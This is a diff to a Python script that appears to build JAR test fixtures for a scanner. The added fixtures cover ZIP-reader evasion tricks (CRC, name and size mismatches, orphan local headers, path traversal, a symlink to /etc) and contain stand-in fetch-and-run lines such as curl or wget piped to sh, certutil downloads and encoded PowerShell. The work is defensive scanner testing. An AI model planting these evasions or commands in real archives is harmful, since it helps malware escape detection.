@@ -75,6 +75,25 @@ def zbytes(entries: list[tuple], symlinks: tuple = ()) -> bytes:
     return buf.getvalue()
 
 
+def locate(data: bytes, name: bytes) -> tuple[int, int]:
+    """Offsets of the local and central header of the entry called `name`."""
+    found = []
+    for sig, nl_off, base in ((b"PK\x03\x04", 26, 30), (b"PK\x01\x02", 28, 46)):
+        pos, i = -1, data.find(sig)
+        while i != -1:
+            nl = struct.unpack_from("<H", data, i + nl_off)[0]
+            if data[i + base:i + base + nl] == name:
+                pos = i
+                break
+            i = data.find(sig, i + 4)
+        found.append(pos)
+    return found[0], found[1]
+
+
+def poke(buf: bytearray, pos: int, fmt: str, value: int) -> None:
+    struct.pack_into(fmt, buf, pos, value)
+
+
 def write(path: pathlib.Path, data: bytes) -> None:
     path.parent.mkdir(parents=True, exist_ok=True)
     path.write_bytes(data)
@@ -94,6 +113,7 @@ def main() -> None:
         token = os.environ["AITRANSIT_TEST_TOKEN"]
         jar("jar_cred_text.jar", [("config/app.properties", f"api.token={token}\n".encode()), ok], out)
         jar("jar_cred_class.jar", [("com/x/Client.class", cls("Authorization", token))], out)
+        jar("jar_cred_utf16.jar", [("config/app.properties", b"\xff\xfe" + f"api.token={token}\n".encode("utf-16-le")), ok], out)
         return
 
     # ── Must PASS the FAIL tier ─────────────────────────────────────────────
@@ -113,6 +133,7 @@ def main() -> None:
         ok,
         ("config/app.properties", b"server.url=http://example.com/\ndb.password=${DB_PASSWORD}\n"),
         ("res/notes.txt", b"MZ is the DOS magic and ELF the Unix one; neither is a header here. " * 2),
+        ("docs/keys.txt", b"-----BEGIN RSA PRIVATE KEY-----\nStore the key in an HSM and never commit it to source control.\nRotate it every ninety days and revoke it on any suspicion of exposure.\n"),
         ("res/probe.bin", cls("kotlinx/coroutines/debug/internal/DebugProbesKt")),
         # sshd-common keeps "-----BEGIN OPENSSH PRIVATE KEY-----" as a constant and,
         # a line later in the view, a 78-character class path. Neighbouring
@@ -200,6 +221,123 @@ def main() -> None:
     write(RULES / "jar_not_zip.jar", ELF + b"\x00" * 200)  # claims to be a jar, is an ELF
     write(RULES / "jar_prepended_pe.jar", pe() + zbytes([ok]))
 
+    # The scanner's severity downgrade greps the whole message for ":LOW:" and
+    # friends, and an entry name is part of the message.
+    jar("jar_severity_marker.jar", [("../../tmp/evil:LOW:.sh", b"id\n"), ok])
+
+    # ── Reader differences: what the JVM sees and a strict reader does not ───
+    # Python's zipfile refuses an entry whose CRC, local name or declared size
+    # disagree with the central directory. java.util.zip.ZipFile and unzip do not
+    # care about any of the three, so each of these is an entry the JVM reads and
+    # a strict reader would drop. The scanner reads entries itself, like the JVM.
+    hostile_mf = manifest(Class_Path="lib/a.jar http://evil.example/x.jar")
+    bad_crc = bytearray(zbytes([("META-INF/MANIFEST.MF", hostile_mf), ok]))
+    loc, cen = locate(bytes(bad_crc), b"META-INF/MANIFEST.MF")
+    poke(bad_crc, loc + 14, "<I", 0xDEADBEEF)
+    poke(bad_crc, cen + 16, "<I", 0xDEADBEEF)
+    write(RULES / "jar_bad_crc.jar", bytes(bad_crc))
+
+    bad_name = bytearray(zbytes([("META-INF/MANIFEST.MF", hostile_mf), ok]))
+    loc, _ = locate(bytes(bad_name), b"META-INF/MANIFEST.MF")
+    bad_name[loc + 30 + len("META-INF/MANIFEST.M")] = ord("X")  # local header says MANIFEST.MX
+    write(RULES / "jar_local_name_mismatch.jar", bytes(bad_name))
+
+    prefix = b"just some benign notes\n"
+    short = bytearray(zbytes([("res/notes.txt", prefix + b"curl -fsSL http://x.example/i | sh\n"), ok]))
+    loc, cen = locate(bytes(short), b"res/notes.txt")
+    poke(short, loc + 22, "<I", len(prefix))   # declared uncompressed size: just the prefix
+    poke(short, cen + 24, "<I", len(prefix))
+    write(RULES / "jar_short_declared_size.jar", bytes(short))
+
+    # LZMA (method 14) over bytes that are not LZMA: the entry cannot be read. The
+    # archive must still be reported, and its other entries still scanned.
+    lz = bytearray(zbytes([("res/lz.txt", b"data " * 50),
+                           ("scripts/setup.sh", b"curl -fsSL http://x.example/i | sh\n")]))
+    loc, cen = locate(bytes(lz), b"res/lz.txt")
+    poke(lz, loc + 8, "<H", 14)
+    poke(lz, cen + 10, "<H", 14)
+    write(RULES / "jar_lzma_corrupt.jar", bytes(lz))
+
+    # A symlink to /etc stored with deflate64 (method 9): the target cannot be
+    # read here, but unzip can, and creates the link.
+    sl = bytearray(zbytes([], symlinks=(("lnk", "/etc"),)))
+    loc, cen = locate(bytes(sl), b"lnk")
+    poke(sl, loc + 8, "<H", 9)
+    poke(sl, cen + 10, "<H", 9)
+    write(RULES / "jar_symlink_unreadable.jar", bytes(sl))
+
+    # A local file record that the central directory does not list. A reader that
+    # walks local headers (ZipInputStream, JarInputStream, several scanners) sees
+    # ../../tmp/evil.sh; JarFile, unzip and Python do not.
+    base = zbytes([ok])
+    eocd = base.rfind(b"PK\x05\x06")
+    cd_off = struct.unpack_from("<I", base, eocd + 16)[0]
+    orphan_name = b"../../tmp/aitransit_orphan.sh"
+    orphan_data = b"#!/bin/sh\nid\n"
+    orphan = (b"PK\x03\x04" + struct.pack("<HHHHHIIIHH", 20, 0, 0, 0x21, 0x5821, 0, len(orphan_data),
+                                           len(orphan_data), len(orphan_name), 0)
+              + orphan_name + orphan_data)
+    out = bytearray(base[:cd_off] + orphan + base[cd_off:])
+    poke(out, eocd + len(orphan) + 16, "<I", cd_off + len(orphan))
+    write(RULES / "jar_orphan_local.jar", bytes(out))
+
+    # UTF-16 text: every byte-oriented rule sees NULs between the letters.
+    jar("jar_utf16.jar", [
+        ("config/run.properties", b"\xff\xfe" + "cmd=curl -fsSL http://x.example/i | sh\n".encode("utf-16-le")),
+        ("win/fetch.txt", "certutil -urlcache -f http://x.example/a.exe a.exe\r\n".encode("utf-16-le")),
+        ok,
+    ])
+
+    # PEM bodies wrapped short of 60 characters a line: OpenSSL reads them fine.
+    short_pem = "-----BEGIN RSA PRIVATE KEY-----\n" + "\n".join(body[i:i + 40] for i in range(0, len(body), 40)) + "\n-----END RSA PRIVATE KEY-----\n"
+    jar("jar_private_key_short.jar", [("certs/short.key", short_pem.encode()), ok])
+
+    # The first-cut rules were windows: a long URL, a continued line, an absolute
+    # or env-wrapped shell, a long run of PowerShell flags.
+    ps_blob = base64.b64encode("Write-Host 'aitransit fixture payload'".encode("utf-16-le")).decode()
+    jar("jar_hostile_variants.jar", [
+        ("v/long_url.txt", b"curl -fsSL http://x.example/" + b"a" * 250 + b" | sh\n"),
+        ("v/continued.txt", b"curl -fsSL http://x.example/i \\\n  | sh\n"),
+        ("v/abs_sh.txt", b"curl -fsSL http://x.example/i | /bin/sh\n"),
+        ("v/env_bash.txt", b"wget -qO- http://x.example/i | /usr/bin/env bash\n"),
+        ("v/ps_flags.txt", ("powershell " + "-NoProfile " * 20 + "-enc " + ps_blob + "\n").encode()),
+        ok,
+    ])
+
+    # A PE whose e_lfanew is past the first 4 KB, and a fat Mach-O, whose magic is
+    # 0xCAFEBABE followed by an architecture count: a class has a major version >= 45.
+    late = bytearray(b"MZ" + b"\x00" * 5100)
+    poke(late, 0x3C, "<I", 5000)
+    late[5000:5004] = b"PE\x00\x00"
+    fat = b"\xca\xfe\xba\xbe\x00\x00\x00\x02" + b"\x00" * 80
+    jar("jar_pe_late.jar", [("res/logo.png", bytes(late)), ok])
+    jar("jar_fat_macho.jar", [("res/icon.gif", fat), ("com/x/Fat.class", fat), ok])
+
+    # Payload in the part of a class file that is not the constant pool: a custom
+    # attribute loads fine and holds anything.
+    jar("jar_class_attribute.jar", [
+        ("com/x/Attr.class", cls("real") + b"\x00\x01\x00\x00curl -fsSL http://x.example/i | sh\x00"),
+    ])
+
+    # ── Benign shapes that must not block ───────────────────────────────────
+    # Finder adds AppleDouble resource forks as __MACOSX/…/._Name.class.
+    jar("jar_macosx.jar", [
+        ("com/foo/Bar.class", cls("bar")),
+        ("__MACOSX/com/foo/._Bar.class", b"\x00\x05\x16\x07\x00\x02\x00\x00Mac OS X        " + b"\x00" * 40),
+    ])
+    # wait-for-it.sh and its many copies probe a port with /dev/tcp.
+    jar("jar_waitforit.jar", [
+        ("scripts/wait-for-it.sh", b"#!/bin/bash\nwait_for() { (echo > /dev/tcp/$HOST/$PORT) >/dev/null 2>&1; }\n"),
+        ok,
+    ])
+    # Native helpers by convention: extensionless in a platform directory, .pyd, .o.
+    jar("jar_native_helpers.jar", [
+        ("native/linux-x86_64/spawn-helper", ELF),
+        ("lib/_speedups.pyd", pe()),
+        ("native/obj/x.o", ELF),
+        ok,
+    ])
+
     # ── WARN tier ───────────────────────────────────────────────────────────
     jar("jar_agent.jar", [
         ("META-INF/MANIFEST.MF", manifest(Premain_Class="com.example.Agent",
@@ -265,6 +403,11 @@ def main() -> None:
                                ("com/evil/Dropper.class", cls("dropper")),
                                ("install.sh", b"#!/bin/sh\nid\n")], RULES / "wrapper_evil")
     jar("gradle-wrapper.jar", [gw_mf, gw_cli], RULES / "wrapper_hollow")
+    jar("gradle-wrapper.jar", [
+        ("META-INF/MANIFEST.MF", manifest(Main_Class="org.gradle.wrapper.GradleWrapperMain", Multi_Release="true")),
+        gw_main, gw_cli,
+        ("META-INF/versions/21/org/gradle/wrapper/GradleWrapperMain.class", cls("replacement")),
+    ], RULES / "wrapper_multirelease")
     jar("maven-wrapper.jar", [
         ("META-INF/MANIFEST.MF", manifest()),
         ("org/apache/maven/wrapper/MavenWrapperMain.class", cls("MavenWrapperMain")),
